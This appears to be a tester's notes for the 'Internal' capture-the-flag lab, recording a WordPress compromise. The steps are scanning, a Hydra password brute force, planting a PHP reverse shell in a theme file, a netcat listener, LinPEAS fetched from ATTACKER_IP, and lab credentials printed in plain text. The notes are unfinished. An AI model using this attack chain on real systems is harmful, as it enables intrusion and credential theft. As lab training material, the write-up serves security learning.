# Internal
## Pre-engagement Briefing
* Client wants penetration test on environment due to be relased to production in 3 weeks.
### Scope of Work
* Conduct external. web app, and internal assessment of provided virtual environment.
* Minimal information provided about assessment - black box test.
* Secure user.txt and root.txt flags as proof of exploitation.
### Scope Allowances
* Ensure tester's hosts file is modified to reflect internal.thm.
* Any tools or techniques are permitted.
* Locate and note all vulnerabilities found.
* Submit found flags to dashboard.
* Only IP address of tester's host is in scope.

## [Amend Hosts file](https://docs.rackspace.com/docs/modify-your-hosts-file)
* `sudo nano /etc/hosts`.
* Add entry for TARGET_IP to resolve to internal.thm.
* CTRL+X 

## Perform Nmap vulnerability scan (Active Scanning: Vulnerability Scanning (T1595.002))
```
nmap -Pn -p- -sV --script=vuln -oN TARGET_IP_scan.nmap TARGET_IP

Nmap scan report for ip-10-10-9-105.eu-west-1.compute.internal (10.10.9.105)
Host is up (0.00053s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 02:A1:1A:FB:45:B9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.22 seconds
```
## TCP/22
### Attempt to connect anonymously ()
```
ssh anonymous@TARGET_IP
anonymous@TARGET_IP's password: 
Permission denied, please try again.
```

## TCP/80
### Perform GoBuster hidden directory scan (Active Scanning: Wordlist Scanning (T1595.003))
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u TARGET_IP > gobuster80.txt

[...snip...]
/blog (Status: 301)
/wordpress (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
[...snip...]
```
### Browse to website
* Displays Apache2 Ubuntu default page - misconfiguration vulnerability.
### Browse directories discovered by GoBuster
* /blog
  * Search box displayed.
  * Viewing page source displays comment that framework is using "twentyseventeen" theme. 
```
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentyseventeen-ie8-css'  href='http://internal.thm/blog/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=20161202' media='all' />
<![endif]-->
<!--[if lt IE 9]>
<script src='http://internal.thm/blog/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=20161020'></script>
<![endif]-->
```
* /wordpress
  * Displays "Oops! That page can't be found." message on WordPress page.
  * Search box displayed.
* /javascript
  * Displays forbidden page.
* /phpmyadmin
  * Displays "Welcome to phpMyAdmin" page with "Log in" form.
  * [Default phpMyAdmin credentials](https://stackoverflow.com/questions/5818358/phpmyadmin-default-login-password).
    * Tried username: root, password: null - "Login without a password is forbidden by configuration (see AllowNoPassword)".
    * Tried username: root, password root - "#1698 - Access denied for user 'root'@'localhost'".
    * Tried username: root, password password - "#1698 - Access denied for user 'root'@'localhost'".
* /server-status
  * Displays forbidden page.
### Perform [WPscan](https://www.kali.org/tools/wpscan/) scan (Active Scanning: Vulnerability Scanning (T1595.002))
```
wpscan --url http://internal.thm/wordpress --enumerate p

[...snip...]
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-01-16T00:00:00.000Z
 | Readme: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.5
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
[...snip...]
[+] Enumerating Users (via Passive and Aggressive Methods)
Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Login Error Messages (Aggressive Detection)
[...snip...]
```
### Identify WordPress administrative logon URL (Reconnaissance: Gather Victim Host Information: Software (T1592.002)
> **[How to Find Your WordPress Login Url](https://kinsta.com/blog/wordpress-login-url/):** If you installed WordPress on a subdirectory (www.yoursite.com/wordpress/) or subdomain (blog.yoursite.com/), add one of the three paths at the very end of your URL such as: www.yoursite.com/wordpress/wp-login.php or blog.yoursite.com/wp-login.php
* Default location is "/wp-login.php".
  * This worked!
### Try default credentials to access WordPress administrative logon URL (Reconnaissance: Gather Victim Host Information: Software (T1592.002)
* [Default Wordpress credentials](https://varyingvagrantvagrants.org/docs/en-US/default-credentials/) are admin / password - "Error: The password you entered for the username admin is incorrect. Lost your password?".
### Password guess WordPress administrative logon URL using Hydra (Credential Access: Brute Force: Password Guessing (T1110.001)
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
 [...snip...]
[80][http-post-form] host: 10.10.9.105   login: admin   password: my2boys
[STATUS] attack finished for 10.10.9.105 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```
### Log into "/WordPress/wp-login.php" using recovered credentials (Initial Access: Valid Accounts: Default Accounts (T1078.001))
* 
### Upload reverse shell to WordPress
* Appearance > Theme Editor.
* Open "Archives" (archive.php) from "Theme Files" list.
  * Using this page reduces risk of reverse shell discovery as main theme still functions. 
* Copy "php-reverse-shell.php" to working folder.
```
cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/Internal
```
* Open copy of "php-reverse-shell.php".
* Edit "ip" field.
* Save and close file.
* Copy and paste code from reverse shell to top of "archive.php" file in WordPress.
* "Update File" in WordPress to save changes.
**Start netcat listener**
```
nc -lvnp 1234
```
**Launch reverse shell**
```
curl http://internal.thm/wordpress/wp-content/themes/twentyseventeen/archive.php
```
**Reverse shell caught by listener**
```
Connection from 10.10.67.166 59196 received!
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:57:28 up 15 min,  0 users,  load average: 0.00, 0.01, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
**Upgrade shell**
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
**Find user.txt**
```
find / -name User.txt -type f 2>/dev/null
```
* No results found.
```
cd /home
ls -la

[...snip...]
drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
```
* No access to direcory.
* Current user has no sudo delegation (`sudo -l`).
* No interesting cron jobs (``cat /etc/crontab).
### Use LinPEAS to enumerate target host
```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
* Serve payload through python webserver.
```
python3 -m http.server
```
* Download LinPEAS to target host.
```
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x ./linpeas.txt
```
  * Ensure that target directory has write permissions.
    * E.g. /tmp.
* Write LinPEAS output to text file.
```
./linpeas.sh -a > linpeas.txt
```
* LinPEAS found wordpress database credentials.
```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' )
```
* LinPEAS found interesting "wp-save.txt" file in "/opt" directory.
```
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
```
* Content of "wp-save.txt".
```
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```
* Attempt to escalate privileges to aubreanna.
```
su aubreanna
Password: bubb13guM!@#123
whoami
aubreanna
id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
```
* LinPEAS found credentials in "config-db.php" file
```
/etc/phpmyadmin/config-db.php:$dbpass='B2Ud4fEOZmVq';
/etc/phpmyadmin/config-db.php:$dbuser='phpmyadmin';
```
* Attempt to login to "/phpmyadmin" login form using recovered credentials
  * Success!
* 


```
### Search for WordPress 5.4.2 exploits
* 
